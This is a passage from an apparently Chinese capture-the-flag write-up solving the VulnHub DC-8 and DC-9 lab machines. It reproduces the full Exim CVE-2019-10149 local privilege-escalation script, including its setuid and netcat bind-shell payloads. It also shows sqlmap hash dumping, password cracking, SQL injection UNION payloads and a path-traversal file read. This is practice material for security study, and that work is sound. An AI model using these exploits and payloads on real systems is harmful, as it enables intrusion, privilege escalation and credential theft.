</span></span><span style=display:flex><span>| init             | varchar<span style=color:#f92672>(</span>254<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| login            | int<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>          |
</span></span><span style=display:flex><span>| mail             | varchar<span style=color:#f92672>(</span>254<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| pass             | varchar<span style=color:#f92672>(</span>128<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| picture          | int<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>          |
</span></span><span style=display:flex><span>| signature        | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| signature_format | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| theme            | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span>     |
</span></span><span style=display:flex><span>| timezone         | varchar<span style=color:#f92672>(</span>32<span style=color:#f92672>)</span>      |
</span></span><span style=display:flex><span>| uid              | int<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span> unsigned |
</span></span><span style=display:flex><span>+------------------+------------------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://61.139.2.138/?nid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -D d7db -T users -C name,pass --dump
</span></span><span style=display:flex><span>Database: d7db
</span></span><span style=display:flex><span>Table: users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> entries<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+--------+---------------------------------------------------------+
</span></span><span style=display:flex><span>| name   | pass                                                    |
</span></span><span style=display:flex><span>+--------+---------------------------------------------------------+
</span></span><span style=display:flex><span>| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
</span></span><span style=display:flex><span>| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
</span></span><span style=display:flex><span>+--------+---------------------------------------------------------+
</span></span></code></pre></div><p>写入hash：</p><pre tabindex=0><code>admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
</code></pre><p>只爆出了john的密码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ john hash
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>2</span> password hashes with <span style=color:#ae81ff>2</span> different salts <span style=color:#f92672>(</span>Drupal7, $S$ <span style=color:#f92672>[</span>SHA512 512/512 AVX512BW 8x<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>32768</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
</span></span><span style=display:flex><span>Proceeding with single, rules:Single
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>10</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>32</span> needed <span style=color:#66d9ef>for</span> performance.
</span></span><span style=display:flex><span>Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
</span></span><span style=display:flex><span>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span style=display:flex><span>turtle           <span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>dirsearch扫出登录页面：</p><pre tabindex=0><code>[13:59:09] 200 -    2KB - /user/                                            
[13:59:09] 200 -    2KB - /user/login/
</code></pre><p><code>contact us</code>中可以传马，不能是纯php代码，否则会返回原来的文本信息：</p><p><img alt=alt loading=lazy src=/images/vulnhub/9.png></p><p>尝试suid提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>www-data:/<span style=color:#f92672>)</span> $ find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/gpasswd
</span></span><span style=display:flex><span>/usr/bin/chsh
</span></span><span style=display:flex><span>/usr/bin/passwd
</span></span><span style=display:flex><span>/usr/bin/sudo
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/sbin/exim4
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>/bin/ping
</span></span><span style=display:flex><span>/bin/su
</span></span><span style=display:flex><span>/bin/umount
</span></span><span style=display:flex><span>/bin/mount
</span></span></code></pre></div><p>exim4提权，先查看版本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>www-data:/<span style=color:#f92672>)</span> $ /usr/sbin/exim4 --version
</span></span><span style=display:flex><span>Exim version 4.89 <span style=color:#75715e>#2 built 14-Jun-2017 05:03:07</span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> University of Cambridge, <span style=color:#ae81ff>1995</span> - <span style=color:#ae81ff>2017</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, <span style=color:#ae81ff>2007</span> - <span style=color:#ae81ff>2017</span>
</span></span><span style=display:flex><span>Berkeley DB: Berkeley DB 5.3.28: <span style=color:#f92672>(</span>September  9, 2013<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Support <span style=color:#66d9ef>for</span>: crypteq iconv<span style=color:#f92672>()</span> IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
</span></span><span style=display:flex><span>Lookups <span style=color:#f92672>(</span>built-in<span style=color:#f92672>)</span>: lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
</span></span><span style=display:flex><span>Authenticators: cram_md5 plaintext
</span></span><span style=display:flex><span>Routers: accept dnslookup ipliteral manualroute queryprogram redirect
</span></span><span style=display:flex><span>Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
</span></span><span style=display:flex><span>Fixed never_users: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Configure owner: 0:0
</span></span><span style=display:flex><span>Size of off_t: <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>Configuration file is /var/lib/exim4/config.autogenerated
</span></span></code></pre></div><p>searchsploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ searchsploit Exim <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>Exim 4.87 - 4.91 - Local Privilege Escalation                                                                                                     | linux/local/46996.sh
</span></span></code></pre></div><p>查看如何使用该脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># raptor_exim_wiz - &#34;The Return of the WIZard&#34; LPE exploit</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># A flaw was found in Exim versions 4.87 to 4.91 (inclusive).</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Improper validation of recipient address in deliver_message()</span>
</span></span><span style=display:flex><span><span style=color:#75715e># function in /src/deliver.c may lead to remote command execution.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># (CVE-2019-10149)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This is a local privilege escalation exploit for &#34;The Return</span>
</span></span><span style=display:flex><span><span style=color:#75715e># of the WIZard&#34; vulnerability reported by the Qualys Security</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Advisory team.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Credits:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Qualys Security Advisory team (kudos for your amazing research!)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Dennis &#39;dhn&#39; Herrmann (/dev/tcp technique)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Usage (setuid method):</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ id</span>
</span></span><span style=display:flex><span><span style=color:#75715e># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ ./raptor_exim_wiz -m setuid</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Preparing setuid shell helper...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Delivering setuid payload...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Waiting 5 seconds...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span>
</span></span><span style=display:flex><span><span style=color:#75715e># # id</span>
</span></span><span style=display:flex><span><span style=color:#75715e># uid=0(root) gid=0(root) groups=0(root)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Usage (netcat method):</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ id</span>
</span></span><span style=display:flex><span><span style=color:#75715e># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ ./raptor_exim_wiz -m netcat</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Delivering netcat payload...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Waiting 5 seconds...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># localhost [127.0.0.1] 31337 (?) open</span>
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span><span style=color:#75715e># uid=0(root) gid=0(root) groups=0(root)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Vulnerable platforms:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exim 4.87 - 4.91</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Tested against:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>METHOD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;setuid&#34;</span> <span style=color:#75715e># default method</span>
</span></span><span style=display:flex><span>PAYLOAD_SETUID<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost&#39;</span>
</span></span><span style=display:flex><span>PAYLOAD_NETCAT<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># usage instructions</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> usage<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;</span>$0<span style=color:#e6db74> [-m METHOD]&#34;</span>
</span></span><span style=display:flex><span>        echo
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;-m setuid : use the setuid payload (default)&#34;</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;-m netcat : use the netcat payload&#34;</span>
</span></span><span style=display:flex><span>        echo
</span></span><span style=display:flex><span>        exit <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload delivery</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> exploit<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># connect to localhost:25</span>
</span></span><span style=display:flex><span>        exec 3&lt;&gt;/dev/tcp/localhost/25
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># deliver the payload</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;helo localhost&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;mail from:&lt;&gt;&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;rcpt to:&lt;</span>$PAYLOAD<span style=color:#e6db74>&gt;&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;data&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i in <span style=color:#f92672>{</span>1..31<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;Received: </span>$i<span style=color:#e6db74>&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;.&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;quit&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        read -u <span style=color:#ae81ff>3</span> <span style=color:#f92672>&amp;&amp;</span> echo $REPLY
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># print banner</span>
</span></span><span style=display:flex><span>echo
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;raptor_exim_wiz - &#34;The Return of the WIZard&#34; LPE exploit&#39;</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#39;</span>
</span></span><span style=display:flex><span>echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># parse command line</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#f92672>[</span> ! -z <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> $1 in
</span></span><span style=display:flex><span>                -m<span style=color:#f92672>)</span> shift; METHOD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span>; shift;;
</span></span><span style=display:flex><span>                * <span style=color:#f92672>)</span> usage
</span></span><span style=display:flex><span>                ;;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>esac</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z $METHOD <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># setuid method</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $METHOD <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;setuid&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># prepare a setuid shell helper to circumvent bash checks</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Preparing setuid shell helper...&#34;</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;main(){setuid(0);setgid(0);system(\&#34;/bin/sh\&#34;);}&#34;</span> &gt;/tmp/pwned.c
</span></span><span style=display:flex><span>        gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $? -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;Problems compiling setuid shell helper, check your gcc.&#34;</span>
</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;Falling back to the /bin/sh method.&#34;</span>
</span></span><span style=display:flex><span>                cp /bin/sh /tmp/pwned
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>        echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># select and deliver the payload</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Delivering </span>$METHOD<span style=color:#e6db74> payload...&#34;</span>
</span></span><span style=display:flex><span>        PAYLOAD<span style=color:#f92672>=</span>$PAYLOAD_SETUID
</span></span><span style=display:flex><span>        exploit
</span></span><span style=display:flex><span>        echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># wait for the magic to happen and spawn our shell</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Waiting 5 seconds...&#34;</span>
</span></span><span style=display:flex><span>        sleep <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>        ls -l /tmp/pwned
</span></span><span style=display:flex><span>        /tmp/pwned
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># netcat method</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>elif</span> <span style=color:#f92672>[</span> $METHOD <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;netcat&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># select and deliver the payload</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Delivering </span>$METHOD<span style=color:#e6db74> payload...&#34;</span>
</span></span><span style=display:flex><span>        PAYLOAD<span style=color:#f92672>=</span>$PAYLOAD_NETCAT
</span></span><span style=display:flex><span>        exploit
</span></span><span style=display:flex><span>        echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># wait for the magic to happen and spawn our shell</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Waiting 5 seconds...&#34;</span>
</span></span><span style=display:flex><span>        sleep <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>        nc -v 127.0.0.1 <span style=color:#ae81ff>31337</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># print help</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span></code></pre></div><p>把sh脚本传到tmp目录下并运行即可提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ./exploit.sh -m setuid
</span></span><span style=display:flex><span>$ ./exploit.sh -m netcat
</span></span></code></pre></div><p>/root/flag.txt：</p><pre tabindex=0><code>Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  &#34;Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;
888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I&#39;m also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p><p><a href=https://www.cnblogs.com/A1oe/p/12585077.html>https://www.cnblogs.com/A1oe/p/12585077.html</a></p><hr><h2 id=vulnhub-dc9>vulnhub DC9<a hidden class=anchor aria-hidden=true href=#vulnhub-dc9>#</a></h2><p>访问web服务，<code>search</code>存在SQL注入点：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#e6db74>&#39; union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=database() #
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ID: 1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Name: 2 3
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Position: 4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Phone No: 5
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Email: StaffDetails,Users
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>0&#39;</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span>,<span style=color:#ae81ff>5</span>,group_concat(<span style=color:#66d9ef>column_name</span>) <span style=color:#66d9ef>from</span> information_schema.columns <span style=color:#66d9ef>where</span> <span style=color:#66d9ef>table_name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Users&#34;</span> <span style=color:#f92672>#</span>
</span></span><span style=display:flex><span>ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Name: <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Position</span>: <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>Phone <span style=color:#66d9ef>No</span>: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>Email: UserID,Username,Password
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#e6db74>&#39; union select 1,2,3,group_concat(Username),5,group_concat(Password) from Users #
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ID: 1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Name: 2 3
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Position: admin
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Phone No: 5
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Email: 
</span></span></span></code></pre></div><p>在线网站 <a href=https://www.somd5.com/>https://www.somd5.com/</a> 解md5：</p><pre tabindex=0><code>856f5de590ef37314e7c3bdf6f8a66dc
transorbital1
</code></pre><p>登录后发现存在<code>file</code>参数的文件包含，本题对端口进行了隐藏，需要通过端口敲门来使ssh服务对敲门成功的ip开放，先获取对应配置文件<code>/etc/knockd.conf</code>：</p><pre tabindex=0><code>http://127.0.0.1:8085/manage.php?file=../../../../etc/knockd.conf

[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
</code></pre><p>依次访问3个端口：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc 61.139.2.139 <span style=color:#ae81ff>7469</span>
</span></span><span style=display:flex><span>nc 61.139.2.139 <span style=color:#ae81ff>8475</span>
</span></span><span style=display:flex><span>nc 61.139.2.139 <span style=color:#ae81ff>9842</span>
</span></span></code></pre></div><p>nmap再次扫描靶机ip：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap -A -p 1-65535 61.139.2.139    
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-09-30 10:08 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.139
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00027s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> a2:b3:38:74:32:74:0b:c5:16:dc:13:de:cb:9b:8a:c3 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 06:5c:93:87:15:54:68:6b:88:91:55:cf:f8:9a:ce:40 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> e4:2c:88:da:88:63:26:8c:93:d5:f7:63:2b:a3:eb:ab <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Example.com - Staff Details - Welcome
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
